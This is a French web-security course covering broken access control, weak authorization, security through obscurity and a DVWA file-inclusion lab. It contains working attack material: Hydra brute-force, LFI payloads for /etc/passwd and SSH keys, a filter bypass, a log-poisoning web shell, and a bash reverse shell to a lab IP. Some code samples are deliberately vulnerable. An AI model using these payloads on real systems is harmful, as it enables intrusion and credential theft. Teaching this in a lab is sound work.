# Cours : Broken Access Control et File Inclusion (DVWA)

## Introduction

Cette section couvre :
- **Broken Access Control** : Défaillances dans les contrôles d'accès [owasp](https://owasp.org/Top10/2021/A01_2021-Broken_Access_Control/)
- **Weak Authorization** : Autorisation faible ou inexistante [invicti](https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/weak-basic-authentication-credentials)
- **Security Through Obscurity** : Mythe de la sécurité par le secret [en.wikipedia](https://en.wikipedia.org/wiki/Security_through_obscurity)
- **DVWA File Inclusion Demo** : Exploitation pratique de LFI [scribd](https://www.scribd.com/presentation/813285063/Understanding-File-Inclusion-Vulnerability)

***

## Partie 1 : Broken Access Control (Contrôle d'accès défaillant)

### 1.1 Définition

**Broken Access Control** : Vulnérabilité permettant aux utilisateurs de **voir ou faire plus que ce qu'ils sont censés pouvoir**. [brightsec](https://brightsec.com/blog/broken-access-control-attack-examples-and-4-defensive-measures/)

**Cause racine** : Trop de confiance accordée au client (navigateur) ou au serveur sans validation appropriée des permissions. [learn.snyk](https://learn.snyk.io/lesson/broken-access-control/)

**Impact** : 
- Accès non autorisé à des données sensibles
- Modification de données d'autres utilisateurs
- Escalade de privilèges (user → admin)
- Contournement des restrictions métier

**OWASP Top 10 2021** : Classé #1 (le plus critique). [owasp](https://owasp.org/Top10/2021/A01_2021-Broken_Access_Control/)

### 1.2 Types de Broken Access Control

#### 1. Insecure Direct Object Reference (IDOR) [portswigger](https://portswigger.net/web-security/access-control)

**Définition** : L'application utilise un identifiant directement manipulable (ID, nom de fichier) dans l'URL ou les paramètres sans vérifier que l'utilisateur a le droit d'accéder à cette ressource.

**Exemple classique** : Profil utilisateur avec ID dans l'URL

**Application vulnérable** :
```
https://example.com/profile?user_id=1234
```

**Exploitation** :
```
# Votre profil (légitime)
https://example.com/profile?user_id=1234

# Profil d'un autre utilisateur (IDOR)
https://example.com/profile?user_id=1235
https://example.com/profile?user_id=1236
```

**Résultat** : Vous pouvez voir les informations personnelles d'autres utilisateurs (nom, email, adresse, commandes, etc.). [learn.snyk](https://learn.snyk.io/lesson/broken-access-control/)

**Code vulnérable** (exemple PHP)  : [owasp](https://owasp.org/Top10/2021/A01_2021-Broken_Access_Control/)
```php
<?php
// Pas de vérification que l'utilisateur connecté peut accéder à cet ID
$user_id = $_GET['user_id'];
$query = "SELECT * FROM users WHERE id = $user_id";
$result = mysqli_query($conn, $query);
echo $result['name'] . " - " . $result['email'];
?>
```

**Code sécurisé** :
```php
<?php
$user_id = $_GET['user_id'];
$current_user_id = $_SESSION['user_id'];

// Vérifier que l'utilisateur demande SES PROPRES données
if ($user_id != $current_user_id) {
    die("Access denied");
}

$query = "SELECT * FROM users WHERE id = $user_id";
$result = mysqli_query($conn, $query);
?>
```

#### 2. Vertical Privilege Escalation [github](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/07-pentesting-red-team/broken-access-control.md)

**Définition** : Un utilisateur de bas niveau (user) accède à des fonctionnalités réservées aux administrateurs.

**Exemple** : Accès direct à la page admin

**URLs** :
```
# Page utilisateur normal (autorisé)
https://example.com/app/userInfo

# Page admin (non autorisé mais accessible)
https://example.com/app/admin_userInfo
```

**Exploitation** :
```
1. Se connecter comme utilisateur normal
2. Deviner/bruteforce l'URL admin
3. Accéder directement sans redirection
```

**Scénario OWASP**  : [owasp](https://owasp.org/Top10/2021/A01_2021-Broken_Access_Control/)
```
https://example.com/app/getappInfo          # User OK
https://example.com/app/admin_getappInfo    # Admin seulement
```

**Résultat** : Si un utilisateur non-admin peut accéder à `admin_getappInfo`, c'est une faille Broken Access Control.

#### 3. Horizontal Privilege Escalation [portswigger](https://portswigger.net/web-security/access-control)

**Définition** : Un utilisateur accède aux données d'un autre utilisateur **du même niveau de privilège**.

**Exemple** : Notes scolaires [learn.snyk](https://learn.snyk.io/lesson/broken-access-control/)

**Requête légitime** :
```
GET /grades?studentid=20223948&subjectid=1293 HTTP/2
Host: api.grades.example.com
```

**Exploitation** :
```
# Changer l'ID étudiant
GET /grades?studentid=20223949&subjectid=1293 HTTP/2

# Résultat : Voir les notes d'un autre étudiant !
```

#### 4. URL et Parameter Manipulation [radware](https://www.radware.com/cyberpedia/application-security/broken-access-control-vulnerabilities/)

**Exemples d'attaques** :

**a) Modification de paramètres GET/POST** :
```
# Original
POST /updateProfile
user_id=1234&name=John&role=user

# Modifié (ajouter le paramètre role)
user_id=1234&name=John&role=admin
```

**b) Cookie manipulation** :
```
# Cookie original
Set-Cookie: user_id=1234; role=user

# Cookie modifié (via DevTools)
Set-Cookie: user_id=1234; role=admin
```

**c) JWT Token tampering**  : [owasp](https://owasp.org/Top10/2021/A01_2021-Broken_Access_Control/)
```json
// Token JWT décodé
{
  "user_id": 1234,
  "role": "user",
  "exp": 1715467200
}

// Token modifié (si signature non vérifiée)
{
  "user_id": 1234,
  "role": "admin",
  "exp": 1715467200
}
```

### 1.3 Exemples réels de Broken Access Control

**Cas 1 : Facebook 2018** [github](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/07-pentesting-red-team/broken-access-control.md)
- Vulnérabilité permettant de voir les photos privées de n'importe quel utilisateur
- IDOR sur l'API de récupération d'images
- Impact : Millions d'utilisateurs exposés

**Cas 2 : Instagram 2019**
- Modification de l'ID de compte dans les requêtes API
- Accès non autorisé aux comptes privés
- Résolution : Ajout de validation côté serveur

**Cas 3 : Application e-commerce**
```
# Voir sa commande
https://shop.com/order?id=12345

# Voir TOUTES les commandes
https://shop.com/order?id=12340
https://shop.com/order?id=12341
...
```

### 1.4 Détection de Broken Access Control (pentest)

**Méthode 1 : Manipulation manuelle**
```
1. Se connecter avec un compte utilisateur normal
2. Noter les URLs accessibles (ex: /profile?id=123)
3. Changer les paramètres ID (id=124, id=125...)
4. Observer si données d'autres utilisateurs sont accessibles
```

**Méthode 2 : Fuzzing avec Burp/ZAP**
```
1. Intercepter une requête légitime
2. Envoyer au Intruder/Fuzzer
3. Fuzzer le paramètre user_id avec des valeurs 1-1000
4. Analyser les réponses (codes 200, tailles différentes)
```

**Méthode 3 : Test de rôles**
```
1. Créer 2 comptes : user et admin
2. Capturer les requêtes admin avec Burp/ZAP
3. Rejouer les requêtes avec le compte user
4. Si succès → Broken Access Control
```

***

## Partie 2 : Weak Authorization (Autorisation faible)

### 2.1 Définition

**Weak Authorization** : L'application **échoue à protéger du contenu sensible** ou utilise des mécanismes d'autorisation facilement contournables. [halock](https://www.halock.com/9-quick-tips-address-weak-authentication/)

**Différence avec Broken Access Control** :
- **Broken Access Control** : Absence totale de vérification
- **Weak Authorization** : Vérification présente mais insuffisante/faible

### 2.2 Exemple : Cookie lisible pour protéger la page admin

**Scénario vulnérable** :

**Code PHP** :
```php
<?php
// Page admin.php
if ($_COOKIE['isAdmin'] != 'true') {
    die("Access denied");
}

// Afficher le contenu admin
echo "Welcome to admin panel";
?>
```

**Problème** : Le cookie `isAdmin` est modifiable par l'utilisateur. [radware](https://www.radware.com/cyberpedia/application-security/broken-access-control-vulnerabilities/)

**Exploitation** :
```
1. Navigateur → DevTools (F12)
2. Application → Cookies
3. Ajouter/Modifier : isAdmin=true
4. Recharger la page admin.php
5. Accès accordé ! ✅
```

**Alternative avec curl** :
```bash
# Sans cookie → Refusé
curl http://example.com/admin.php

# Avec cookie → Accès admin
curl http://example.com/admin.php -H "Cookie: isAdmin=true"
```

### 2.3 Autres exemples de Weak Authorization

**a) Vérification côté client uniquement**  : [learn.snyk](https://learn.snyk.io/lesson/broken-access-control/)

**JavaScript vulnérable** :
```javascript
// Page admin cachée par JavaScript
if (user.role !== 'admin') {
    document.getElementById('adminPanel').style.display = 'none';
}
```

**Contournement** :
```
1. DevTools → Console
2. document.getElementById('adminPanel').style.display = 'block';
3. Panel admin visible !
```

**b) Hidden fields non vérifiés**  : [owasp](https://owasp.org/Top10/2021/A01_2021-Broken_Access_Control/)

**HTML** :
```html
<form method="POST" action="/updateProfile">
  <input type="text" name="username" value="john">
  <input type="hidden" name="role" value="user">  <!-- Modifiable ! -->
  <button type="submit">Update</button>
</form>
```

**Exploitation** :
```
1. Intercepter avec Burp Suite
2. Modifier : role=user → role=admin
3. Forward
```

**c) Mots de passe faibles/par défaut**  : [invicti](https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/weak-basic-authentication-credentials)

**Credentials communs** :
```
admin:admin
admin:password
admin:123456
root:root
test:test
```

**Exploitation** :
```bash
# Brute force avec Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

### 2.4 Protection contre Weak Authorization

**Bonnes pratiques**  : [portswigger](https://portswigger.net/web-security/authentication)

1. ✅ **Validation côté serveur** : JAMAIS de confiance au client
2. ✅ **Sessions sécurisées** : Utiliser des tokens cryptographiques (JWT signé)
3. ✅ **Principe du moindre privilège** : Donner le minimum de permissions
4. ✅ **Authentification forte** : MFA, passwords complexes
5. ✅ **Logs et monitoring** : Détecter les tentatives d'escalade

**Exemple sécurisé** :
```php
<?php
session_start();

// Vérifier la SESSION (côté serveur), pas un cookie
if ($_SESSION['role'] !== 'admin') {
    http_response_code(403);
    die("Access denied");
}

// Vérifier également l'IP (défense en profondeur)
if ($_SESSION['ip'] !== $_SERVER['REMOTE_ADDR']) {
    session_destroy();
    die("Session hijacking detected");
}

// Contenu admin
?>
```

***

## Partie 3 : Security Through Obscurity (Sécurité par l'obscurité)

### 3.1 Définition

**Security Through Obscurity** : Pratique consistant à **cacher les détails ou mécanismes d'un système** pour renforcer sa sécurité. [outpost24](https://outpost24.com/blog/security-through-obscurity-dangers/)

**Principe** : "Si personne ne sait comment ça fonctionne, personne ne peut l'attaquer."

**Réalité** : ❌ **Ce n'est PAS une vraie sécurité**. [okta](https://www.okta.com/identity-101/security-through-obscurity/)

### 3.2 Exemples de Security Through Obscurity

**a) Cacher la page admin avec un nom obscur** :

**URLs** :
```
# Mauvais : Nom évident
https://example.com/admin

# "Obscur" : Nom aléatoire
https://example.com/x7k2p9admin_v2_final
```

**Problème** : Un scan de répertoires (dirb, gobuster) trouvera quand même la page. [outpost24](https://outpost24.com/blog/security-through-obscurity-dangers/)

```bash
gobuster dir -u https://example.com -w common.txt
# Résultat : /x7k2p9admin_v2_final (Status: 200)
```

**b) Port non-standard** :

**Configuration** :
```
# SSH sur port 22 (standard)
ssh user@server

# SSH sur port 34221 (obscur)
ssh -p 34221 user@server
```

**Problème** : Un scan Nmap trouvera le port. [outpost24](https://outpost24.com/blog/security-through-obscurity-dangers/)

```bash
nmap -p- server
# 34221/tcp open  ssh
```

**c) Obfuscation de code**  : [en.wikipedia](https://en.wikipedia.org/wiki/Security_through_obscurity)

**JavaScript obfusqué** :
```javascript
eval(function(p,a,c,k,e,d){...}('admin',12,12,...))
```

**Problème** : Outils de déobfuscation (JS Beautifier) rendent le code lisible.

**d) Algorithme de chiffrement secret/maison**  : [okta](https://www.okta.com/identity-101/security-through-obscurity/)

**Mauvais** : Inventer son propre algorithme de chiffrement
```python
# Algorithme "secret" XOR simple
def encrypt(text, key):
    return ''.join(chr(ord(c) ^ key) for c in text)
```

**Problème** : Une fois découvert (reverse engineering), l'algorithme est cassé instantanément. [okta](https://www.okta.com/identity-101/security-through-obscurity/)

**Bon** : Utiliser des standards éprouvés (AES-256, RSA) qui restent sûrs **même si publics**.

### 3.3 Pourquoi Security Through Obscurity ne fonctionne pas

**Principe de Kerckhoffs** (cryptographie)  : [en.wikipedia](https://en.wikipedia.org/wiki/Security_through_obscurity)
> "Un système cryptographique doit être sûr **même si tout est connu publiquement, sauf la clé**."

**Arguments contre STO**  : [en.wikipedia](https://en.wikipedia.org/wiki/Security_through_obscurity)

1. ❌ **Faux sentiment de sécurité** : On néglige de vraies protections
2. ❌ **Une fois découvert = totalement cassé** : Aucune défense en profondeur
3. ❌ **Reverse engineering** : Le code peut être décompilé, analysé
4. ❌ **Insiders** : Employés mécontents peuvent révéler les secrets
5. ❌ **Breach inévitable** : Tôt ou tard, le secret sera exposé

**Exemple réel** : Adobe (2013) [outpost24](https://outpost24.com/blog/security-through-obscurity-dangers/)
- Adobe utilisait un algorithme de chiffrement "secret" pour protéger les mots de passe
- Breach : 150 millions de comptes exposés
- L'algorithme révélé était faible et facilement cassable
- Si Adobe avait utilisé bcrypt/Argon2 (standards publics), les passwords seraient restés sûrs

### 3.4 Quand peut-on utiliser l'obscurité ?

**L'obscurité peut être une couche supplémentaire, JAMAIS la seule**. [okta](https://www.okta.com/identity-101/security-through-obscurity/)

**Acceptable** : Obscurité + Vraie sécurité
```
✅ Port SSH non-standard (22 → 34221) + Authentification par clé RSA 4096 bits
✅ Nom de page admin aléatoire + JWT signé avec secret fort
✅ Obfuscation JavaScript + Validation côté serveur robuste
```

**Inacceptable** : Obscurité seule
```
❌ Port SSH non-standard + Mot de passe faible
❌ Nom de page admin aléatoire + Cookie non signé
❌ Obfuscation JavaScript + Pas de validation serveur
```

**Résumé**  : [okta](https://www.okta.com/identity-101/security-through-obscurity/)
> "Security through obscurity does not exist as a standalone security measure."

***

## Partie 4 : DVWA - File Inclusion Demo

### 4.1 Configuration de l'environnement

**Lancer DVWA** :
```bash
# Avec Docker
docker run -d -p 8001:80 vulnerables/web-dvwa

# Accéder à DVWA
http://servertcm:8001
# OU
http://localhost:8001
```

**Connexion** :
```
Username: admin
Password: password
```

**Configuration initiale** :
```
1. DVWA Security → Set to "Low"
2. Create / Reset Database
3. Login
```

### 4.2 Accéder à File Inclusion

```
1. Menu de gauche → File Inclusion
2. Observer les boutons : file1.php, file2.php, file3.php
```

**URL typique** :
```
http://servertcm:8001/vulnerabilities/fi/?page=file1.php
```

### 4.3 Analyse du comportement (Security: Low)

**Test initial** : Cliquer sur "file1"

**URL** :
```
http://servertcm:8001/vulnerabilities/fi/?page=file1.php
```

**Observation** : Le serveur lit et affiche le contenu de `file1.php`.

**Hypothèse** : Le paramètre `page` contrôle quel fichier est inclus → Potentiel LFI. [scribd](https://www.scribd.com/presentation/813285063/Understanding-File-Inclusion-Vulnerability)

### 4.4 Exploitation : Lire /etc/passwd

**Objectif** : Récupérer la liste des utilisateurs système en lisant `/etc/passwd`.

**Payload** :
```
http://servertcm:8001/vulnerabilities/fi/?page=../../../../../../etc/passwd
```

**Explication** :
- `../` : Remonte d'un répertoire (path traversal)
- Répété 6-7 fois pour atteindre la racine `/`
- `/etc/passwd` : Fichier cible

**Résultat** :
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:999:999::/home/mysql:/bin/sh
```

**Succès** : Liste des usernames obtenue ! [scribd](https://www.scribd.com/presentation/813285063/Understanding-File-Inclusion-Vulnerability)

### 4.5 Documenter dans ZAP

**Créer une alerte** :
```
1. ZAP → Clic droit sur la requête /fi/?page=../../../../../../etc/passwd
2. New Alert
3. Configuration :
   - Name : File Inclusion - /etc/passwd disclosure
   - Risk : High
   - Confidence : Confirmed
   - Description : Application reads arbitrary files via 'page' parameter
   - Solution : Implement whitelist of allowed files
4. Save
```

**Résultat** : L'alerte apparaît dans le rapport ZAP pour documentation.

### 4.6 Test avec Security: High

**Changer le niveau de sécurité** :
```
1. DVWA Security → Set to "High"
2. Retourner à File Inclusion
```

**Tester le même payload** :
```
http://servertcm:8001/vulnerabilities/fi/?page=../../../../../../etc/passwd
```

**Résultat** : ❌ **Message d'erreur** : "ERROR: File not found!"

**Analyse** : DVWA High Security bloque les path traversal simples. [scribd](https://www.scribd.com/presentation/813285063/Understanding-File-Inclusion-Vulnerability)

### 4.7 Analyse du code source (Security: High)

**Voir le code** :
```
1. DVWA → View Source (bouton en bas à droite)
2. Observer la validation
```

**Code PHP (Security: High)**  : [scribd](https://www.scribd.com/presentation/813285063/Understanding-File-Inclusion-Vulnerability)
```php
<?php
$file = $_GET['page'];

// Vérifier que le fichier contient "file"
if (!strpos($file, "file")) {
    echo "ERROR: File not found!";
    exit;
}

// Inclure le fichier
include($file);
?>
```

**Logique de protection** :
- Le paramètre `page` **doit contenir la chaîne "file"**
- Si absent → Erreur
- Sinon → Inclusion

**Bypass** : Inclure "file" dans le chemin, puis naviguer vers `/etc/passwd`. [scribd](https://www.scribd.com/presentation/813285063/Understanding-File-Inclusion-Vulnerability)

### 4.8 Contournement de la protection High

**Payload modifié** :
```
http://servertcm:8001/vulnerabilities/fi/?page=file/../../../../../../etc/passwd
```

**Explication** :
1. `file` : Satisfait la vérification `strpos($file, "file")`
2. `/../` : Annule le répertoire "file" (qui n'existe pas vraiment)
3. `../../../../../../` : Remonte jusqu'à `/`
4. `etc/passwd` : Cible finale

**Chemin résolu par le serveur** :
```
./file/../../../../../../etc/passwd
→ ./../../../../../etc/passwd
→ ../../../../etc/passwd
→ /etc/passwd
```

**Résultat** : ✅ **Succès** ! Contenu de `/etc/passwd` affiché. [scribd](https://www.scribd.com/presentation/813285063/Understanding-File-Inclusion-Vulnerability)

### 4.9 Exploitation avancée

**Autres fichiers sensibles à cibler** :

**a) Credentials de base de données** :
```
http://servertcm:8001/vulnerabilities/fi/?page=file/../../../config/config.inc.php
```

**b) Logs Apache (log poisoning)** :
```
http://servertcm:8001/vulnerabilities/fi/?page=file/../../../../../../var/log/apache2/access.log
```

**c) Clés SSH privées** :
```
http://servertcm:8001/vulnerabilities/fi/?page=file/../../../../../../root/.ssh/id_rsa
```

**d) Fichier de session PHP** :
```
http://servertcm:8001/vulnerabilities/fi/?page=file/../../../../../../var/lib/php/sessions/sess_PHPSESSID
```

### 4.10 Escalade vers RCE via Log Poisoning

**Technique** : Injecter du code PHP dans les logs, puis inclure le fichier de log. [scribd](https://www.scribd.com/presentation/813285063/Understanding-File-Inclusion-Vulnerability)

**Étape 1 : Empoisonner le log Apache**
```bash
# Injecter du PHP dans le User-Agent
curl http://servertcm:8001 \
  -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
```

**Log Apache généré** :
```
192.168.1.50 - - [11/May/2026:21:45:00] "GET / HTTP/1.1" 200 - "<?php system($_GET['cmd']); ?>"
```

**Étape 2 : Inclure le log via LFI**
```
http://servertcm:8001/vulnerabilities/fi/?page=file/../../../../../../var/log/apache2/access.log&cmd=whoami
```

**Résultat** : Le code PHP dans le log est exécuté !
```
www-data
```

**Étape 3 : Commandes système**
```
# Lister fichiers
?page=file/../../../../../../var/log/apache2/access.log&cmd=ls -la

# Lire fichiers sensibles
?page=file/../../../../../../var/log/apache2/access.log&cmd=cat /etc/shadow

# Reverse shell
?page=file/../../../../../../var/log/apache2/access.log&cmd=bash -c 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1'
```

***

## Partie 5 : Protections contre File Inclusion

### 5.1 Whitelist d'inclusion

**Code sécurisé** :
```php
<?php
$allowed_files = ['file1.php', 'file2.php', 'file3.php'];
$file = $_GET['page'];

if (!in_array($file, $allowed_files)) {
    die("Invalid file");
}

include($file);
?>
```

### 5.2 Validation stricte du chemin

```php
<?php
$file = $_GET['page'];

// Résoudre le chemin absolu
$real_path = realpath($file);

// Vérifier qu'il est dans le répertoire autorisé
if (strpos($real_path, '/var/www/html/includes/') !== 0) {
    die("Path traversal detected");
}

include($real_path);
?>
```

### 5.3 Désactiver les wrappers PHP dangereux

**php.ini** :
```ini
allow_url_fopen = Off
allow_url_include = Off
```

**Impact** : Empêche les inclusions distantes (RFI).

### 5.4 Permissions fichiers restrictives

```bash
# Logs accessibles uniquement par root
chmod 600 /var/log/apache2/access.log

# Config DB accessible uniquement par www-data
chown www-data:www-data /var/www/config.php
chmod 400 /var/www/config.php
```

***

## Résumé : Points clés à retenir

1. **Broken Access Control** : Utilisateurs accèdent à plus que prévu (IDOR, escalade privilèges) [brightsec](https://brightsec.com/blog/broken-access-control-attack-examples-and-4-defensive-measures/)
2. **IDOR** : Manipulation d'ID dans URL (user_id=1234 → user_id=1235) [portswigger](https://portswigger.net/web-security/access-control)
3. **Vertical Escalation** : User → Admin (accès pages admin) [portswigger](https://portswigger.net/web-security/access-control)
4. **Horizontal Escalation** : User A → User B (données d'autres users) [portswigger](https://portswigger.net/web-security/access-control)
5. **Weak Authorization** : Cookie modifiable, validation client-side, passwords faibles [portswigger](https://portswigger.net/web-security/authentication)
6. **Security Through Obscurity** : ❌ N'est PAS une vraie sécurité [en.wikipedia](https://en.wikipedia.org/wiki/Security_through_obscurity)
7. **STO acceptable** : Seulement comme couche supplémentaire, jamais seule [okta](https://www.okta.com/identity-101/security-through-obscurity/)
8. **DVWA LFI Low** : Path traversal direct (../../etc/passwd) [scribd](https://www.scribd.com/presentation/813285063/Understanding-File-Inclusion-Vulnerability)
9. **DVWA LFI High** : Contourner avec file/../../etc/passwd [scribd](https://www.scribd.com/presentation/813285063/Understanding-File-Inclusion-Vulnerability)
10. **Log Poisoning** : Injecter PHP dans logs → RCE via LFI [scribd](https://www.scribd.com/presentation/813285063/Understanding-File-Inclusion-Vulnerability)
11. **Protection LFI** : Whitelist, realpath(), désactiver wrappers [scribd](https://www.scribd.com/presentation/813285063/Understanding-File-Inclusion-Vulnerability)
12. **ZAP Alert** : Documenter les vulnérabilités trouvées (Risk: High, Confidence: Confirmed)

